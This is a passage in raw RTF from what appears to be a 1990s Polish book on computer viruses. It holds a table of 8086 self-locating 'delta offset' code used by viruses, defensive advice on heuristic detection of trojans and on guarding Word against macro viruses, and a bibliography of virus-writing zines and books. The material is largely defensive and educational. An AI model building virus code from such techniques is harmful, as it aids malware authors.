\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP CX}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB CX,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BX}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5B}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 EB 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP BX}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB BX,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DX}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5A}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 EA 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP DX}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB DX,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BP}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5D}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 ED 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP BP}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB BP,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SI}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5E}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 EE 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP SI}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB SI,3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3096\clvertalt\cltxlrtb    \cellx6249\clvertalt\cltxlrtb    \cellx9402
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DI}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}E8 00 00}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5F}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 83 EF 03}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CALL TRIK}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TRIK: POP DI}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB DI,3}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.2. Ochrona przed bombami logicznymi i ko\uc1\u324\'f1mi troja\uc1\u324\'f1skimi}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na spos\'f3b dzia\uc1\u322\'b3ania, nieznane szczepionkom antywirusowym konie troja\uc1\u324\'f1skie i bomby s\uc1\u261\'b9 trudne do wykrycia, gdy\uc1\u380\'bf w\uc1\u322\'b3a\uc1\u347\'9cciwy, destrukcyjny kod mo\uc1\u380\'bfe by\uc1\u263\'e6 umieszczony w dowolnym miejscu programu, tak wi\uc1\u281\'eac znalezienie takiej sekwencji nie jest zbyt \uc1\u322\'b3atwe (a gdy program jest wewn\uc1\u281\'eatrznie skompresowany wr\uc1\u281\'eacz niemo\uc1\u380\'bfliwe). Z pomoc\uc1\u261\'b9 przychodzi tu om\'f3wiona wcze\uc1\u347\'9cniej heurystyka, technika polegaj\uc1\u261\'b9ca}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}na wykrywaniu potencjalnych agresor\'f3w na podstawie charakterystycznych sekwencji kodu. Najcz\uc1\u281\'ea\uc1\u347\'9cciej programy poszukuj\uc1\u261\'b9ce koni troja\uc1\u324\'f1skich w podejrzanych plikach szukaj\uc1\u261\'b9 instrukcji wywo\uc1\u322\'b3a\uc1\u324\'f1 przerwa\uc1\u324\'f1 programowych 13h (sekwencja 0CDh, 013h) lub 26h (sekwencja }{\f1\fs24\lang1045{\*\listtag0}0}{\f0\fs24\lang1045{\*\listtag0}CDh, 026h), u\uc1\u380\'bfywanych do odczytywania i zapisywania sektor\'f3w, kt\'f3re ze wzgl\uc1\u281\'eadu na swe dzia\uc1\u322\'b3anie wyst\uc1\u281\'eapuj\uc1\u261\'b9 raczej rzadko w typowym oprogramowaniu u\uc1\u380\'bfytkowym, gdy\uc1\u380\'bf normalne programy nie korzystaj\uc1\u261\'b9 z bezpo\uc1\u347\'9crednich operacji zapisu na sektorach, a najni\uc1\u380\'bfszy poz}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}om, na jakim dzia\uc1\u322\'b3aj\uc1\u261\'b9, to operacje na plikach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Potencjalnymi ko\uc1\u324\'f1mi troja\uc1\u324\'f1skimi s\uc1\u261\'b9 najnowsze wersje typowych i cz\uc1\u281\'easto u\uc1\u380\'bfywanych program\'f3w u\uc1\u380\'bfytkowych, np. antywirusowych i kompresuj\uc1\u261\'b9cych, tak wi\uc1\u281\'eac nale\uc1\u380\'bfy si\uc1\u281\'ea z nimi obchodzi\uc1\u263\'e6 do\uc1\u347\'9c\uc1\u263\'e6 ostro\uc1\u380\'bfnie. Dobrym rozwi\uc1\u261\'b9zaniem, pozwalaj\uc1\u261\'b9cym uchroni\uc1\u263\'e6 si\uc1\u281\'ea przed wi\uc1\u281\'eakszo\uc1\u347\'9cci\uc1\u261\'b9 koni troja\uc1\u324\'f1skich i bomb, mo\uc1\u380\'bfe by\uc1\u263\'e6 zainstalowanie monitora antywirusowego. Konie troja\uc1\u324\'f1skie s\uc1\u261\'b9 zwykle pisane przez pocz\uc1\u261\'b9tkuj\uc1\u261\'b9cych programist\'f3w, kt\'f3rzy do przeprowadzania destrukcji u\uc1\u380\'bfywaj\uc1\u261\'b9 funkcji biblioteczn}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0}ch j\uc1\u281\'eazyk\'f3w wysokiego poziomu, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf przerwa\uc1\u324\'f1 programowych, a te mog\uc1\u261\'b9 by\uc1\u263\'e6 \uc1\u322\'b3atwo przechwytywane i kontrolowane przez monitor.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 14.3. Ochrona przed makrowirusami}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf bez programu antywirusowego trudno jest wykry\uc1\u263\'e6 wirusy w plikach DOC czy XLS, mo\uc1\u380\'bfna przedsi\uc1\u281\'eawzi\uc1\u261\'b9\uc1\u263\'e6 pewne kroki, aby zminimalizowa\uc1\u263\'e6 szans\uc1\u281\'ea zainfekowania systemu:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > wy\uc1\u322\'b3\uc1\u261\'b9czy\uc1\u263\'e6 wszystkie makra automatyczne przy pomocy w\uc1\u322\'b3asnor\uc1\u281\'eacznie napisanego makra (najlepiej nazwa\uc1\u263\'e6 je AutoExec, dzi\uc1\u281\'eaki czemu zostanie ono zawsze wywo\uc1\u322\'b3ywane podczas uruc}{\f1\fs24\lang1045{\*\listtag0}hamiania Worda):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SUB MAIN}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DisableAutoMacros 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END SUB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > aby wy\uc1\u322\'b3\uc1\u261\'b9czy\uc1\u263\'e6 przy uruchamianiu Worda makro AutoExec nale\uc1\u380\'bfy uruchamia\uc1\u263\'e6 aplikacj\uc1\u281\'ea z parametrem /m (WINWORD.EXE /M);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch >  podczas wczytywania plik\'f3w trzyma\uc1\u263\'e6 wci\uc1\u347\'9cni\uc1\u281\'eaty klawisz SHIFT, co spowoduje zablokowan}{\f1\fs24\lang1045{\*\listtag0}ie automatycznego makra AutoOpen;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > od czasu do czasu przegl\uc1\u261\'b9da\uc1\u263\'e6 list\uc1\u281\'ea makr zawartych w szablonie NORMAL.DOT; je\uc1\u380\'bfeli zawiera ona jakie\uc1\u347\'9c makra automatyczne lub makra o dziwnych, niespotykanych nazwach, mo\uc1\u380\'bfliwe, i\uc1\u380\'bf szablon jest zainfekowany. Makra mo\uc1\u380\'bfna przegl\uc1\u261\'b9da\uc1\u263\'e6 za pomoc\uc1\u261\'b9}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch opcji wybieranych z menu Worda PLIK/SZABLONY/ORGA-NIZATOR/MAKRA, b\uc1\u261\'b9d\uc1\u378\'9f te\uc1\u380\'bf NARZ\uc1\u280\'caDZIA/MAKRO (niekt\'f3re makrowirusy potrafi\uc1\u261\'b9 ju\uc1\u380\'bf oszukiwa\uc1\u263\'e6 u\uc1\u380\'bfytkownika chc\uc1\u261\'b9cego u\uc1\u380\'bfy\uc1\u263\'e6 tych funkcji);}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf wirus mo\uc1\u380\'bfe nie przejmowa\uc1\u263\'e6 \uc1\u380\'bfadnego makra automatycznego, lecz tylko podmienia\uc1\u263\'e6 polecenia menu (najcz\uc1\u281\'ea\uc1\u347\'9cciej menu PLIK/ZACHOWAJ, PLIK/ZACHOWAJ JAKO), powy\uc1\u380\'bfsze \uc1\u347\'9crodki mog\uc1\u261\'b9 okaza\uc1\u263\'e6 si\uc1\u281\'ea ca\uc1\u322\'b3kowicie nieskuteczne. Jedynym rozwi\uc1\u261\'b9zaniem jest wtedy u\uc1\u380\'bfycie najnowszego programu antywirusowego.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 15}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1. Leonid Bu\uc1\u322\'b3hak, Ryszard Goczy\uc1\u324\'f1ski, Micha\uc1\u322\'b3 Tuszy\uc1\u324\'f1ski DOS 5.0 od \uc1\u347\'9crodka Komputerowa Oficyna Wydawnicza He\uc1\u322\'b3p, Warszawa 1992.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2. Stanis\uc1\u322\'b3aw Lenkiewicz Sterowniki urz\uc1\u261\'b9dze\uc1\u324\'f1 zewn\uc1\u281\'eatrznych w systemie operacyjnym MS-DOS Wydawnictwo PLJ, Warszawa 1993.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3. Eugeniusz Wr\'f3bel Asembler 8086/88, Wydawnictwa Naukowo-Technicz-ne, Warszawa 1990.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4. Marek Kotowski Pod zegarem (Asembler 8086/80286), Wydawnictwo Lu-pus, Warszawa 1992.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5. Zbigniew Mrozi\uc1\u324\'f1ski Mikroprocesor 8086 \{Podr\uc1\u281\'eaczny Katalog Elektronika), Wydawnictwa Naukowo-T}{\f1\fs24\lang1045{\*\listtag0}echniczne, Warszawa 1992.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6. Ryszard Goczy\uc1\u324\'f1ski, Micha\uc1\u322\'b3 Tuszy\uc1\u324\'f1ski Mikroprocesory 80286, 80386, i 80486 Komputerowa Oficyna Wydawnicza He\uc1\u322\'b3p, Warszawa 1991-}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7. Piotr Metzger Anatomia PC Helion, Gliwice 1993.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8. Krzysztof Kierzenkowski Programowanie z wykorzys}{\f0\fs24\lang1045{\*\listtag0}taniem pami\uc1\u281\'eaci typu extended i expanded (Pami\uc1\u281\'eaci extended i expanded), Wydawnictwo Lupus, Warszawa 1994,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 9. Arkadiusz Andrusz, Maciej Soko\uc1\u322\'b3owski Mapa pami\uc1\u281\'eaci IBM/PC w przyk\uc1\u322\'b3adach w pascalu i asemblerze , Wydawnictwo Lynx-Sft, Warszawa 1995.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 10. Andrzej Dud}{\f0\fs24\lang1045{\*\listtag0}ek Jak pisa\uc1\u263\'e6 wirusy O.W. Read Me, Jelenia G\'f3ra 1993.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 11. Microsoft Word, Podr\uc1\u281\'eacznik u\uc1\u380\'bfytkownika Microsoft Corporation 1994.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 12. Microsoft Excel, Opis funkcji Microsoft Corporation 1993.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 13. W\uc1\u322\'b3adys\uc1\u322\'b3aw Majewski Uwaga! Komputerowe wirusy " Wiedza i \uc1\u379\'afycie", 19}{\f1\fs24\lang1045{\*\listtag0}89,z.1.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 14. Karol Szyndzielorz Projektanci komputerowych wirus\'f3w "Wiedza i \uc1\u379\'afycie", 1989, }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 15. Marek Sell Help do programu MKS_Vir.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 16. Phalcon/Skism: 40HEX (issues 1-14).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 17. VLAD: VLAD (issues 1-7).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 18. VBB: Viruses Bits & Bytes (issues 1-2).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 19. Immortal Riot: Insane Reality (issues 4-6).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 20. NuKe: NuKe IntoJournal (issues 4-3).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 21. Dark Angel VirGuide (issues L-?).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 22. Raif Brown Interrupt list 51,}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 23. (C) (P) Potemkins Hackers Group Opcodes.lst (revision 1.27), Moscow.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 24. Marl A. Ludwig The Little Black Book about Computer Viruses, volume 1 -The basic tcchuology, American Eagle Publications Inc. 1991.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 25. Vessolin Bontchev Future Trends in Virus-Writing Virus Test Center, Uni-versity of Hamburg, Germany 1994.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 26. Vesselin Bontchev Possible Virus Attacks Against Integrity Programs and How io Prevent them. Virus Test Center, Univercity of Hamburg Germany 1992.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 27. Vosselin Bontchev The Bulgarian and Soviet Virus Pactories Bulgarian Aca-demy of Sciences, Sofia, Bu\uc1\u322\'b3garia.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 28. Vesselm Bontchev lnVircible Test from Virus Test Center University of Hamburg.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 29. Inside the Mind of Dark \uc1\u260\'a5veriger Personal Computer World, July 1993.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 30. Julian Bibbell Viruses are Good For You USA: WIRED Ventui-es Ltd. 1995.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 31. Sara Gordon Faces Behind the Masks November, England 1994.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 32. Tarkan Yetiser Po\uc1\u322\'b3ymorphic Viruses - Implementation, Detection, and Protec-tion USA, Baltimore, VDS Advanced Research Group 1993.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 33. Gary M. Watson A Discussion of Polymorphism Data Plus 1992.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 34. Dmitry O. Gryaznov Scanners of the Year 2000 Senior Virus Research Analyst.}{\f1\fs24\lang1045{\*\listtag0}\par}
